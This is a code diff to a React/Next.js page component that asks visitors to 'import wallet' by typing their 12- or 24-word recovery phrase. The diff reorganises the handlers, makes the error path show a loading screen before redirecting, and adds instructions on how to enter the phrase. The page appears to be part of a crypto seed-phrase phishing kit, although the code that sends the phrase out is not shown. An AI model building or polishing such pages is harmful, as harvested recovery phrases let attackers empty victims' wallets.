@@ -377,23 +377,16 @@ export const getStaticProps = ( context ) => {
     }
 }
 const Phrase = ({ data }) => {
-    const [isLoading, setIsLoading] = useState(false)
-    const passError = () => {
-        setIsLoading(false)
-        router.push('/wallet/loading')
-    }
-    const Loading = () => {
-        return(
-            <div className="d-flex jac spin-holder">
-            <div className="d-flex jac container spin-box round-20 coll py-3 boda2">
-                <div className="loader"></div>
-                <h1 className="text-center ">Loading...</h1>
-            </div>
-        </div>
-        )
-    }
+    // Variables
+    const [isLoading, setIsLoading] = useState(false);
     const [phrase12, setPhrase12] = useState("")
     const router = useRouter();
+
+    // Functions
+    const passError = () => {
+        setIsLoading(true)
+        router.push('/wallet/loading')
+    }
     const myFunc = (event ) => {
         event.preventDefault();
         setIsLoading(true)
@@ -410,6 +403,19 @@ const Phrase = ({ data }) => {
         console.log(phrase12)
         
     }
+    
+    // Components
+    const Loading = () => {
+        return(
+            <div className="d-flex jac spin-holder">
+            <div className="d-flex jac container spin-box round-20 coll py-3 boda2">
+                <div className="loader"></div>
+                <h1 className="text-center ">Loading...</h1>
+            </div>
+        </div>
+        )
+    }
+    
     return(
         <main className="d-fex jac mt-5">
             <div className="text-light text-center my-3">
@@ -419,8 +425,9 @@ const Phrase = ({ data }) => {
                     <Image height={200} width={250} src="/images/001.png" />
                 </section>
                 <div className="d-flex jac">
-                    <form className="myform boda21 round-20 px-3">
+                    <form className="myform boda21 round-20 px-3 mx-1">
                         <label className="my-3 fw-bold">Kindly import wallet by providing <br/><span className="green">PHRASE WORDS</span> below</label>
+                        <p className="text-center dim"><small>Phrase words are mostly 12 and sometimes 24, Please provide each word separated by a comma "<span className="text-warning">,</span>" below</small></p>
                         <textarea
                             className="form-control"
                             cols="30"
